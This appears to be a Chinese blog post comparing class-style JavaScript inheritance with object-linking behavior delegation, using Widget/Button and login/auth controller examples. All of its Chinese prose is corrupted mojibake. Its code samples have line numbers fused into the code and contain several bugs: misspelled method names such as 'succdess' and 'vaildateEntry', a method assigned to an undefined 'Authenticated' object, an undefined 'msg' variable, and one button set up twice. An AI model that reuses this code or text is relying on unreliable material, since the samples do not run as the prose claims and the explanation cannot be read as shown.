è¿™ä¸ªbugçŽ°åœ¨å·²ç»è¢«ä¿®å¤äº†ï¼Œè°·æ­Œæµè§ˆå™¨å†…éƒ¨è·Ÿè¸ªï¼ˆåªç”¨äºŽè°ƒè¯•è¾“å‡ºï¼‰â€œæž„é€ å‡½æ•°åç§°â€çš„æ–¹æ³•æ˜¯å®ƒè‡ªèº«çš„ä¸€ç§æ‰©å±•è¡Œä¸ºï¼Œå¹¶ä¸åŒ…å«åœ¨ JavaScript è§„èŒƒä¸­ã€‚ å¦‚æžœä½¿ç”¨çš„å¹¶ä¸æ˜¯ â€œæž„é€ å‡½æ•°â€æ¥ç”Ÿæˆå¯¹è±¡ï¼Œæ¯”å¦‚ä½¿ç”¨æœ¬ç« ä»‹ç»çš„å¯¹è±¡å…³è”é£Žæ ¼æ¥ç¼–å†™ä»£ç ï¼Œé‚£ä¹ˆè°·æ­Œæµè§ˆå™¨å°±æ— æ³•è·Ÿè¸ªå¯¹è±¡å†…éƒ¨çš„ â€œæž„é€ å‡½æ•°åç§°â€ï¼Œè¿™æ ·çš„å¯¹è±¡è¾“å‡ºçš„å°±æ˜¯ â€œObject{}â€ï¼Œæ„æ€æ˜¯â€œObject() æž„é€ å‡ºæ¥çš„å¯¹è±¡â€ã€‚ å½“ç„¶ï¼Œè¿™å¹¶ä¸æ˜¯å¯¹è±¡å…³è”çš„é£Žæ ¼çš„ç¼ºç‚¹ï¼Œå½“ä½ ä½¿ç”¨å¯¹è±¡å…³è”é£Žæ ¼æ¥ç¼–å†™ä»£ç å¹¶ä½¿ç”¨è¡Œä¸ºå§”æ‰˜è®¾è®¡æ¨¡å¼æ—¶ï¼Œå¹¶ä¸éœ€è¦å…³æ³¨è°â€œæž„é€ äº†â€å¯¹è±¡ï¼ˆå°±æ˜¯ä½¿ç”¨ new æ¥ç¼–å†™çš„é‚£ä¸ªå‡½æ•°ï¼‰ã€‚åªæœ‰ä½¿ç”¨ç±»é£Žæ ¼æ¥ç¼–å†™ä»£ç æ—¶ï¼Œè°·æ­Œæµè§ˆå™¨å†…éƒ¨çš„ â€œæž„é€ å‡½æ•°åç§°â€è·Ÿè¸ªæ‰æœ‰æ„ä¹‰ï¼Œä½¿ç”¨å¯¹è±¡å…³è”æ—¶è¿™ä¸ªåŠŸèƒ½èµ·ä¸åˆ°ä»»ä½•çš„ä½œç”¨ã€‚ æ¯”è¾ƒæ€ç»´æ¨¡åž‹çŽ°åœ¨å·²ç»æ˜Žç™½äº†â€œç±»â€å’Œâ€œå§”æ‰˜â€è¿™ä¸¤ç§è®¾è®¡æ¨¡å¼çš„ç†è®ºåŒºåˆ«ï¼ŒæŽ¥ä¸‹æ¥çœ‹çœ‹ä»–ä»¬åœ¨æ€ç»´æ¨¡åž‹æ–¹é¢çš„åŒºåˆ«ã€‚ é€šè¿‡ä¸€äº›å®žä¾‹ä»£ç æ¥æ¯”è¾ƒä¸€ä¸‹ä¸¤ç§è®¾è®¡æ¨¡å¼ï¼ˆé¢å‘å¯¹è±¡å’Œå¯¹è±¡å…³è”ï¼‰å…·ä½“çš„å®žçŽ°æ–¹æ³•ï¼Œä¸‹é¢æ˜¯å…¸åž‹ï¼ˆâ€œåŽŸåž‹â€ï¼‰é¢å‘å¯¹è±¡é£Žæ ¼ï¼š 123456789101112131415161718function Foo(who)&#123; this.me = who;&#125;Foo.prototype.identify = function()&#123; return "I am" + this.me;&#125;function Bar(who)&#123; Foo.call(this,who);&#125;Bar.prototype = Object.create(Foo.prototype);Bar.prototype.speak = function()&#123; alert('Hello,'+this.identify()+".");&#125;var b1 = new Bar("b1");var b2 = new Bar("b2");b1.speak();b2.speak(); å­ç±» Bar å§”æ‰˜äº† çˆ¶ç±» Foo,ç„¶åŽç”Ÿæˆäº† b1 å’Œ b2 ä¸¤ä¸ªå®žä¾‹ã€‚b1 å§”æ‰˜äº† Bar.prototype,Bar.prototype å§”æ‰˜äº†Foo.prototypeã€‚ ä¸‹é¢çœ‹çœ‹å¦‚ä½•ä½¿ç”¨é¢å‘å¯¹è±¡å…³è”é£Žæ ¼æ¥ç¼–å†™å®Œå…¨ç›¸åŒçš„ä»£ç ï¼š 123456789101112131415161718Foo = &#123; init:function(who)&#123; this.me = who; &#125; identify:function()&#123; return "I am" + this.me; &#125;&#125;Bar = Object.create(Foo);Bar.speak = function()&#123; alert('Hello,'+this.identify()+".");&#125;var b1 = Object.create(Bar);var b2 = Object.create(Bar); b1.init();b2.init();b1.speak();b2.speak(); è¿™æ®µä»£ç ä¸­æˆ‘ä»¬åŒæ ·åˆ©ç”¨äº† [[Prototype]] æŠŠb1 å§”æ‰˜ç»™äº† Bar å¹¶æŠŠ Bar å§”æ‰˜ç»™äº† Foo,å’Œä¸Šä¸€æ®µæ–¹é¢ä¸€æ¨¡ä¸€æ ·ï¼Œæˆ‘ä»¬ä»ç„¶å®žçŽ°äº†ä¸‰ä¸ªå¯¹è±¡ä¹‹é—´çš„å…³è”ã€‚ ä½†æ˜¯éžå¸¸é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™æ®µä»£ç ç®€æ´äº†å¾ˆå¤šã€‚æˆ‘ä»¬åªæ˜¯æŠŠå¯¹è±¡å…³è”èµ·æ¥ï¼Œå¹¶ä¸éœ€è¦é‚£äº›æ—¢å¤æ‚åˆä»¤äººå›°æƒ‘çš„æ¨¡ä»¿ç±»çš„è¡Œä¸ºï¼ˆæž„é€ å‡½æ•°ã€åŽŸåž‹å·²ç» newï¼‰. é¦–å…ˆï¼Œç±»é£Žæ ¼çš„ä»£ç çš„æ€ç»´æ¨¡åž‹å¼ºè°ƒå®žä½“ä»¥åŠå®žä½“é—´çš„å…³ç³» ä¹‹è¡Œä¸ºå§”æ‰˜-ç±»é£Žæ ¼ä»£ç çš„æ€ç»´æ¨¡åž‹.png) çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä»Žå›¾ä¸­å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€å¼ éžå¸¸å¤æ‚çš„å…³ç³»å›¾ï¼Œæ­¤å¤–ï¼Œä½ è·Ÿç€å›¾ç‰‡ä¸­çš„ç®­å¤´èµ°å°±ä¼šå‘çŽ°ï¼ŒJavaScript ä¸­æœ‰å¾ˆå¼ºçš„å†…éƒ¨è¿žè´¯æ€§ã€‚ ä¸¾ä¸ªä¾‹å­ï¼ŒJavaScript æŒ‡å“ªä¸ªçš„å‡½æ•°ä¹‹æ‰€ä»¥å¯ä»¥è®¿é—® callã€applyã€bind æ˜¯å› ä¸ºå‡½æ•°æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ã€‚è€Œå‡½æ•°å¯¹è±¡åŒæ ·æœ‰ [[Prototype]] å±žæ€§å¹¶å…³è”åˆ° Function.prototype å¯¹è±¡ï¼Œå› æ­¤æ‰€æœ‰å‡½æ•°å¯¹è±¡éƒ½å¯ä»¥é€šè¿‡å§”æ‰˜æ¥è°ƒç”¨è¿™äº›é»˜è®¤æ–¹æ³•ã€‚ ä¸‹é¢çœ‹ç®€åŒ–ç‰ˆçš„ï¼Œæ›´åŠ æ¸…æ™°â€”â€”åªå±•ç¤ºäº†å¿…è¦çš„å¯¹è±¡å’Œå…³ç³»ï¼š ä¹‹è¡Œä¸ºå§”æ‰˜-ç±»é£Žæ ¼ä»£ç çš„æ€ç»´æ¨¡åž‹(ç®€åŒ–ç‰ˆ).png) è™šçº¿è¡¨ç¤ºçš„æ˜¯ Bar.prototype ç»§æ‰¿ Foo.prototype ä¹‹åŽä¸¢å¤±çš„ .constructor å±žæ€§å¼•ç”¨ï¼Œå®ƒä»¬è¿˜æ²¡æœ‰è¢«ä¿®å¤ã€‚å³ä½¿ç§»é™¤è¿™äº›è™šçº¿ï¼Œè¿™ä¸ªæ€ç»´æ¨¡åž‹åœ¨ä½ å¤„ç†å…³è”æ—¶ä»ç„¶éžå¸¸å¤æ‚ã€‚ çœ‹çœ‹å¯¹è±¡å…³è”é£Žæ ¼ä»£ç çš„æ€ç»´æ¨¡åž‹ï¼š ä¹‹è¡Œä¸ºå§”æ‰˜-å¯¹è±¡å…³è”é£Žæ ¼ä»£ç çš„æ€ç»´æ¨¡åž‹) é€šè¿‡è¿™äº›å¯ä»¥çœ‹å‡ºï¼Œå¯¹è±¡å…³è”é£Žæ ¼çš„ä»£ç æ˜¾ç„¶æ›´åŠ ç®€æ´ï¼Œå› ä¸ºè¿™ç§ä»£ç åªå…³æ³¨ä¸€ä»¶äº‹æƒ…ï¼šå¯¹è±¡ä¹‹é—´çš„å…³è”å…³ç³»ã€‚ å…¶ä»– â€œç±»â€æŠ€å·§éƒ½æ˜¯éžå¸¸å¤æ‚å¹¶ä¸”ä»¤äººå›°æƒ‘çš„ã€‚åŽ»æŽ‰å®ƒä»¬ä¹‹åŽï¼Œäº‹æƒ…ä¼šå˜å¾—ç®€å•è®¸å¤šï¼ˆåŒæ—¶ä¿ç•™æ‰€æœ‰åŠŸèƒ½ï¼‰ã€‚ ç±»å’Œå¯¹è±¡æˆ‘ä»¬å·²ç»çœ‹åˆ°äº† â€œç±»â€ å’Œ â€œè¡Œä¸ºå§”æ‰˜â€åœ¨ç†è®ºå’Œæ€ç»´æ¨¡åž‹æ–¹é¢çš„åŒºåˆ«ï¼ŒçŽ°åœ¨çœ‹çœ‹çœŸå®žåœºæ™¯å¦‚ä½•åº”ç”¨è¿™äº›æ–¹æ³•ã€‚ çœ‹çœ‹ Web å¼€å‘ä¸­éžå¸¸ç»å…¸çš„ä¸€äº›å‰ç«¯åœºæ™¯ï¼šåˆ›å»º UI æŽ§ä»¶ï¼ˆæŒ‰é’®ã€ä¸‹æ‹‰åˆ—è¡¨ç­‰ç­‰ï¼‰ã€‚ æŽ§ä»¶â€œç±»â€å¯èƒ½ä½ å·²ç»ä¹ æƒ¯äº†é¢å‘å¯¹è±¡çš„è®¾è®¡æ¨¡å¼ï¼Œæ‰€ä»¥å¾ˆå¿«ä¼šæƒ³åˆ°ä¸€ä¸ªåŒ…å«æ‰€æœ‰é€šç”¨æŽ§ä»¶è¡Œä¸ºçš„çˆ¶ç±»å’Œç»§æ‰¿çˆ¶ç±»çš„ç‰¹æ®ŠæŽ§ä»¶å­ç±»ã€‚ è¿™é‡Œå°†ä½¿ç”¨JQ æ¥æ“ä½œ DOM å’Œ CSSï¼Œå› ä¸ºè¿™äº›æ“ä½œå’Œæˆ‘ä»¬è®¨è®ºçš„å†…å®¹æ²¡æœ‰å¤ªå¤šçš„å…³ç³»ã€‚ ä¸‹é¢è¿™æ®µä»£ç å±•ç¤ºçš„æ˜¯å¦‚ä½•ä¸ä½¿ç”¨ä»»ä½• â€œç±»â€è¾…åŠ©åº“æˆ–è€…è¯­æ³•çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ çº¯ JavaScript å®žçŽ° ç±»é£Žæ ¼çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041// çˆ¶ç±»function Widget(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null;&#125;Widget.prototype.render = function($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125;&#125;// å­ç±»function Button(width,height,label)&#123; // è°ƒç”¨ â€œsuperâ€ æž„é€ å‡½æ•° Widget.call(this,width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label);&#125;// è®© Button ç»§æ‰¿ WidgetButton.prototype = Object.create(Widget.prototype);// é‡å†™ render(...)Button.prototype.render = function($where)&#123; // â€œsuperâ€ è°ƒç”¨ Widget.prototype.render.call(this,$where); this.$elem.click(this.onClick.bind(this));&#125;Button.prototype.onClick = function(evt)&#123; console.log("Button "+ this.label +" clicked!");&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); åœ¨é¢å‘å¯¹è±¡è®¾è®¡æ¨¡å¼ä¸­æˆ‘ä»¬éœ€è¦çŽ°åœ¨çˆ¶ç±»ä¸­å®šä¹‰åŸºç¡€çš„ render(..)ï¼Œç„¶åŽåœ¨å­ç±»ä¸­é‡å†™å®ƒã€‚å­ç±»å¹¶ä¸ä¼šæ›¿æ¢åŸºç¡€çš„ render(..)ï¼Œåªæ˜¯æ·»åŠ äº†ä¸€äº›æŒ‰é’®ç‰¹æœ‰çš„æ¬£æ…°ã€‚å¯ä»¥çœ‹åˆ°ä»£ç ä¸­ä¸‘é™‹çš„æ˜¾å¼ä¼ªå¤šæ€ï¼Œå³é€šè¿‡ Widget.call å’Œ Widget.prototype.render.call ä»Žâ€œå­ç±»â€æ–¹æ³•ä¸­å¼•ç”¨â€œçˆ¶ç±»â€ä¸­çš„åŸºç¡€æ–¹æ³•ã€‚ ES6 çš„ class è¯­æ³•ç³–ç®€å•ä»‹ç»å¦‚ä½•ä½¿ç”¨ class æ¥å®žçŽ°ç›¸åŒçš„åŠŸèƒ½ï¼š 123456789101112131415161718192021222324252627282930313233343536373839// çˆ¶ç±»class Widget&#123; constructor(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125; render($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;class Button extends Widget&#123; constructor(width,height,label)&#123; super(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125; render($where)&#123; super.render($where) this.$elem.click(this.onClick.bind(this)); &#125; onClick(evt)&#123; console.log("Button "+ this.label +" clicked!"); &#125;&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); æ¯«æ— ç–‘é—®ï¼Œä½¿ç”¨äº† ES6 çš„ classä¹‹åŽï¼Œä¸Šä¸€æ®µä»£ç ä¸­å¾ˆå¤šä¸‘é™‹çš„è¯­æ³•éƒ½ä¸è§äº†ï¼Œsuper(..) å‡½æ•°å¾ˆæ£’ã€‚ å°½ç®¡è¯­æ³•ä¸Šå¾—åˆ°äº†æ”¹è¿›ï¼Œä½†å®žé™…ä¸Šè¿™é‡Œå¹¶æ²¡æœ‰çœŸæ­£çš„ç±»ï¼Œclass ä»ç„¶æ˜¯é€šè¿‡ [[Prototype]] æœºåˆ¶å®žçŽ°çš„ï¼Œå› ä¸ºæˆ‘ä»¬ä»ç„¶é¢ä¸´æ€ç»´æ¨¡å¼ä¸åŒ¹é…çš„é—®é¢˜ã€‚ æ— è®ºä½ ä½¿ç”¨ä¼ ç»Ÿçš„åŽŸåž‹è¯­æ³•è¿˜æ˜¯ ES6 æ–°è¯­æ³•ç³–ï¼Œä»ç„¶éœ€è¦ç”¨ â€œç±»â€çš„æ¦‚å¿µæ¥å¯¹é—®é¢˜è¿›è¡Œå»ºæ¨¡ã€‚ å§”æ‰˜æŽ§ä»¶å¯¹è±¡ä¸‹é¢çš„ä¾‹å­ä½¿ç”¨å¯¹è±¡å…³è”é£Žæ ¼å§”æ‰˜æ¥ç®€å•å®žçŽ° Widget/Buttonï¼š 12345678910111213141516171819202122232425262728293031323334353637383940var Widget = &#123; init:function(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125;, insert:function($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;;var Button = Object.create(Widget);Button.setup = function(width,height,label)&#123; // å§”æ‰˜è°ƒç”¨ this.init(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125;Button.build = function($where)&#123; // å§”æ‰˜è°ƒç”¨ this.insert($where) this.$elem.click(this.onClick.bind(this)); &#125;Button.OnClick = function(evt)&#123; console.log("Button "+ this.label +" clicked!");&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = Object.create(Button); var btn2 = Object.create(Button); btn1.setup(125,30,"Hello"); btn1.setup(150,40,"World"); btn1.build($body); btn2.build($body);&#125;); ä½¿ç”¨å¯¹è±¡å…³è”æ¥ç¼–å†™ä»£ç æ—¶ä¸éœ€è¦æŠŠ Widget å’Œ Button å½“åšçˆ¶ç±»å’Œå­ç±»ï¼Œç›¸åï¼ŒWidget åªæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«ä¸€ä¸ªé€šç”¨çš„å‡½æ•°ï¼Œä»»ä½•ç±»åž‹çš„æŽ§ä»¶éƒ½å¯ä»¥ä½œä¸ºå§”æ‰˜ï¼ŒButton åŒæ ·åªæ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚ ä»Žè®¾è®¡æ¨¡å¼çš„è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰åƒç±»ä¸€æ ·åœ¨ä¸¤ä¸ªå¯¹è±¡ä¸­éƒ½å®šä¹‰ç›¸åŒçš„æ–¹æ³•å render(..) ï¼Œç›¸åæˆ‘ä»¬å®šä¹‰äº†ä¸¤ä¸ªæ›´å…·æœ‰æè¿°æ€§çš„æ–¹æ³•åï¼ˆinsert/buildï¼‰ã€‚åŒç†ï¼Œåˆå§‹åŒ–æ–¹æ³•åˆ†åˆ«å«åš init å’Œ setupã€‚ åœ¨å§”æ‰˜è®¾è®¡çš„æ¨¡å¼ä¸­ï¼Œé™¤äº†å»ºè®®ä½¿ç”¨ä¸ç›¸åŒçš„å¹¶ä¸”æ›´å…·æœ‰æè¿°æ€§çš„æ–¹æ³•åä¹‹å¤–ï¼Œè¿˜è¦é€šè¿‡å¯¹è±¡å…³è”é¿å…ä½¿ç”¨ä¸‘é™‹çš„æ˜¾å¼ä¼ªå¤šæ€è°ƒç”¨ï¼Œè€Œæ˜¯ç”¨ç®€å•çš„ç›¸å¯¹å§”æ‰˜è°ƒç”¨ this.init() å’Œ this.insertã€‚ ä»Žè¯­æ³•è§’åº¦æ¥è¯´ï¼Œæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ä»»ä½•çš„æž„é€ å‡½æ•° ã€.prototype æˆ–è€… new.å®žé™…ä¸Šä¹Ÿæ²¡æœ‰å¿…è¦ä½¿ç”¨å®ƒä»¬ã€‚ ä»”ç»†è§‚å¯Ÿçš„è¯ï¼Œä¼šå‘çŽ°ä¹‹å‰çš„ä¸€æ¬¡è°ƒç”¨ ï¼ˆvar btn1 = new Button(125,30,â€Helloâ€);ï¼‰å˜æˆäº†ä¸¤æ¬¡ï¼ˆvar btn1 = Object.create(Button);btn1.setup(125,30,â€Helloâ€);ï¼‰å’‹ä¸€çœ‹è¿™ä¼¼ä¹Žæ˜¯ä¸€ä¸ªç¼ºç‚¹ï¼ˆéœ€è¦æ›´å¤šçš„ä»£ç ï¼‰ã€‚ ä½†æ˜¯è¿™ä¸€ç‚¹å…¶å®žä¹Ÿæ˜¯å¯¹è±¡å…³è”é£Žæ ¼ç›¸æ¯”è¾ƒä¼ ç»ŸåŽŸåž‹é£Žæ ¼ä»£ç çš„ä¼˜åŠ¿çš„åœ°æ–¹ï¼Œä¸ºä»€ä¹ˆï¼Ÿ ä½¿ç”¨ç±»æž„é€ çš„è¯ï¼Œä½ éœ€è¦ï¼ˆå¹¶ä¸æ˜¯ç¡¬æ€§è¦æ±‚ï¼Œä½†æ˜¯å¼ºçƒˆå»ºè®®ï¼‰åœ¨åŒä¸€ä¸ªæ­¥éª¤ä¸­å®žçŽ°æž„é€ å’Œåˆå§‹åŒ–ã€‚ç„¶åŽï¼Œè®¸å¤šæƒ…å†µä¸‹æŠŠè¿™ä¸¤æ­¥åˆ†å¼€ï¼ˆå°±åƒå¯¹è±¡å…³è”ä»£ç ä¸€æ ·ï¼‰æ›´çµæ´»ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œå‡å¦‚åœ¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªå®žä¾‹æ± ï¼Œç„¶åŽä¸€ç›´ç­‰åˆ°å®žä¾‹è¢«å–å‡ºæ¥å¹¶ä½¿ç”¨æ‰æ‰§è¡Œç‰¹å®šçš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ä¸¤ä¸ªå‡½æ•°è°ƒç”¨æ˜¯æŒ¨ç€çš„ã€‚ä½†æ˜¯å®Œå…¨å¯ä»¥æ ¹æ®éœ€è¦è®©å®ƒä»¬å‡ºçŽ°åœ¨ä¸åŒçš„ä½ç½®ã€‚ å¯¹è±¡å…³è”å¯ä»¥æ›´å¥½åœ°æ”¯æŒå…³æ³¨åˆ†ç¦»ï¼ˆseparation of concernsï¼‰åŽŸåˆ™ï¼Œåˆ›å»ºå’Œåˆå§‹åŒ–å¹¶ä¸éœ€è¦åˆå¹¶ä¸ºä¸€ä¸ªæ­¥éª¤ æ›´ç®€æ´çš„è®¾è®¡å¯¹è±¡å…³è”é™¤äº†èƒ½è®©ä»£ç çœ‹èµ·æ¥æ›´åŠ ç®€æ´ï¼ˆå¹¶ä¸”å°±æœ‰æ›´å¥½çš„æ‰©å±•æ€§ï¼‰å¤–è¿˜å¯ä»¥é€šè¿‡è¡Œä¸ºå§”æ‰˜æ¨¡å¼ç®€åŒ–ä»£ç ç»“æž„ã€‚ ä¸‹é¢çš„åœºæ™¯ä¸­æˆ‘ä»¬æœ‰ä¸¤ä¸ªæŽ§åˆ¶å™¨å¯¹è±¡ï¼Œä¸€ä¸ªç”¨æ¥æ“ä½œç½‘é¡µä¸­çš„ç™»å½•è¡¨å•ï¼Œä¸€ä¸ªç”¨æ¥ä¸ŽæœåŠ¡å™¨è¿›è¡ŒéªŒè¯ï¼ˆé€šä¿¡ï¼‰ã€‚ æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¾…åŠ©å‡½æ•°æ¥åˆ›å»º Ajax é€šä¿¡ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ jqï¼Œå®ƒä¸ä»…å¯ä»¥å¤„ç† Ajax å¹¶ä¸”è¿”å›žä¸€ä¸ªç±» Promise çš„ç»“æžœï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ .then() æ¥ç›‘å¬å“åº”ã€‚ åœ¨ä¼ ç»Ÿçš„ç±»è®¾è®¡æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬ä¼šæŠŠåŸºç¡€çš„å‡½æ•°å®šä¹‰åœ¨åä¸º Controller çš„ç±»ä¸­ï¼Œç„¶åŽæ´¾ç”Ÿå‡ºä¸¤ä¸ªå­ç±» LoginController å’Œ AuthController ï¼Œå®ƒä»¬éƒ½ç»§æ‰¿è‡ª Controller å¹¶ä¸”é‡å†™äº†ä¸€äº›åŸºç¡€è¡Œä¸ºï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// çˆ¶ç±»function Controller()&#123; this.error = [];&#125;Controller.prototype.showDialog = function(title,msg)&#123; // ç»™ç”¨æˆ·æ˜¾ç¤ºæ ‡é¢˜å’Œæ¶ˆæ¯&#125;Controller.prototype.success = function(msg)&#123; this.showDialog("Success",msg);&#125;Controller.prototype.failure = function(err)&#123; this.errors.push(err); this.showDialog("Error",msg);&#125;// å­ç±»function LoginController()&#123; Controller.call(this);&#125;// æŠŠå­ç±»å…³è”åˆ°çˆ¶ç±»LoginController.prototype = Object.create(Controller.prototype);LoginController.prototype.getUser = function()&#123; return document.getElementById("login_username").value;&#125;LoginController.prototype.getPassword = function()&#123; return document.getElementById("login_password").value;&#125;LoginController.prototype.validateEntry = function(user,pw)&#123; user = user || this.getUser(); pw = pw || this.getPassword(); if(!(user &amp;&amp; pw))&#123; return this.failure("Please enter a username &amp; password!") &#125;else if(pw.length &lt; 5)&#123; return this.failure("Password must be 5+ characters!") &#125; // å¦‚æžœè¿™è¡Œåˆ°è¿™é‡Œè¯´æ˜Žé€šè¿‡éªŒè¯ return true;&#125;// é‡å†™åŸºç¡€çš„ failure()LoginController.prototype.failure = function(err)&#123; // "super" è°ƒç”¨ Controller.prototype.failure.call(this,"Login invalid" + err);&#125;// å­ç±»function AuthController(login)&#123; Controller.call(this); // åˆæˆ this.login = login;&#125;// æŠŠå­ç±»å…³è”åˆ°çˆ¶ç±»AuthController.prototype = Object.create(Controller.prototype);AuthController.prototype.server = function(url,data)&#123; return $.ajax(&#123; url:url, data:data &#125;)&#125;AuthController.prototype.checkAuth = function()&#123; var user = this.login.getUser(); var pw = this.login.getPassword(); if(this.login.validateEntry(user,pw))&#123; this.server("/check-auth",&#123; user:user, pw:pw &#125;).then(this.succdess.bind(this)) .fail(this.failure.bind(this)) &#125;&#125;// é‡å†™ successAuthController.prototype.success = function()&#123; // super è°ƒç”¨ Controller.prototype.success.call(this,"Authenticated!");&#125;// é‡å†™ failureAuthController.prototype.failure = function()&#123; // super è°ƒç”¨ Controller.prototype.success.call(this,"Auth Failed: "+ err);&#125;// é™¤äº†ç»§æ‰¿ï¼Œæˆ‘ä»¬è¿˜è¦åˆæˆvar auth = new AuthController(new LoginController);auth.checkAuth(); æ‰€æœ‰æŽ§åˆ¶å™¨å…±äº«çš„åŸºç¡€è¡Œä¸ºæ˜¯ success å’Œ failure å’Œ showDialogã€‚å­ç±» LoginController å’Œ AuthController é€šè¿‡é‡å†™ failure å’Œ success æ¥æ‰©å±•é»˜è®¤åŸºç¡€ç±»è¡Œä¸ºã€‚æ­¤å¤–ï¼Œæ³¨æ„ AuthController éœ€è¦ä¸€ä¸ª LoginController çš„å®žä¾‹æ¥ç™»å½•è¡¨å•è¿›è¡Œäº¤äº’ï¼Œå› æ­¤è¿™ä¸ªå®žä¾‹å˜æˆäº†ä¸€ä¸ªæ•°æ®å±žæ€§ã€‚ å¦å¤–è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨ç»§æ‰¿çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ä¸€äº›åˆæˆã€‚AuthController éœ€è¦ä½¿ç”¨ LoginController ï¼Œå› ä¸ºæˆ‘ä»¬å®žä¾‹åŒ–åŽè€…å¹¶ç”¨ä¸€ä¸ªç±»æˆå‘˜å±žæ€§ this.login æ¥å¼•ç”¨å®ƒï¼Œè¿™æ · AuthController å°±å¯ä»¥è°ƒç”¨ LoginController çš„è¡Œä¸ºäº†ã€‚ ä½ å¯èƒ½æƒ³è®© AuthController ç»§æ‰¿ LoginController æˆ–è€…ç›¸åï¼Œè¿™æ ·æˆ‘ä»¬å°±é€šè¿‡ç»§æ‰¿å®žçŽ°äº†çœŸæ­£çš„åˆæˆï¼Œä½†æ˜¯è¿™å°±æ˜¯ç±»ç»§æ‰¿åœ¨é—®é¢˜é¢†åŸŸå»ºæ¨¡æ—¶äº§ç”Ÿçš„é—®é¢˜ï¼Œå› ä¸º AutController å’Œ LoginController éƒ½ä¸å…·å¤‡å¯¹æ–¹çš„åŸºç¡€è¡Œä¸ºï¼Œæ‰€ä»¥è¿™ç§ç»§æ‰¿æ˜¯ä¸æ°å½“çš„ã€‚æˆ‘ä»¬çš„è§£å†³æ–¹æ³•å°±æ˜¯è¿›è¡Œä¸€äº›å°±ç®€å•çš„åˆæˆä»Žè€Œè®©å®ƒä»¬æ—¢ä¸å¿…äº’ç›¸ç»§æ‰¿åˆå¯ä»¥äº’ç›¸åˆä½œã€‚ åç±»ä½†æ˜¯ï¼Œæˆ‘ä»¬çœŸçš„éœ€è¦ä¸€ä¸ª Controller çˆ¶ç±»ï¼Œä¸¤ä¸ªå­ç±»åŠ ä¸Šåˆæˆæ¥å¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œå»ºæ¨¡å—ï¼Ÿèƒ½ä¸èƒ½ä½¿ç”¨å¯¹è±¡å…³è”é£Žæ ¼çš„è¡Œä¸ºå§”æ‰˜æ¥å®žçŽ°æ›´ç®€å•çš„è®¾è®¡å‘¢ï¼Ÿå½“ç„¶å¯ä»¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354var LoginController = &#123; error:[], getUser:function()&#123; return document.getElementById("login_username").value; &#125;, getPassword:function()&#123; return document.getElementById("login_password").value; &#125;, vaildateEntry:function(user,pw)&#123; user = user || this.getUser(); pw = pw || this.getPassword(); if(!(user &amp;&amp; pw))&#123; return this.failure("Please enter a username &amp; password!") &#125;else if(pw.length &lt; 5)&#123; return this.failure("Password must be 5+ characters!") &#125; // å¦‚æžœè¿™è¡Œåˆ°è¿™é‡Œè¯´æ˜Žé€šè¿‡éªŒè¯ return true; &#125;, showDialog:function()&#123; // ç»™ç”¨æˆ·æ˜¾ç¤ºæ ‡é¢˜å’Œæ¶ˆæ¯ &#125;, failure:function(err)&#123; this.error.push(err); this.showDialog("Error","Login invalid" + err); &#125;&#125;// è®© AuthController å§”æ‰˜ LoginControllervar AuthController = Object.create(LoginController);AuthController.errors = [];AuthController.checkAuth = function()&#123; var user = this.getUser(); var pw = this.getPassword(); if(this.validateEntry(user,pw))&#123; this.server("/check-auth",&#123; user:user, pw:pw &#125;) .then(this.accepted.bind(this)) .fail(this.rejected.bind(this)) &#125; &#125;AuthController.server = function(url,data)&#123; return $.ajax(&#123; url:url, data:data &#125;)&#125;AuthController.accepted = function()&#123; this.showDialog("Success","Authenticated!");&#125;Authenticated.rejected = function(err)&#123; this.failure("Auth Failed!",err); &#125; ç”±äºŽ AuthController åªæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå› ä¸ºæˆ‘ä»¬ä¸éœ€è¦å®žä¾‹åŒ–åªè¦ä¸€è¡Œä»£ç ï¼š 1AuthController.checkAuth(); 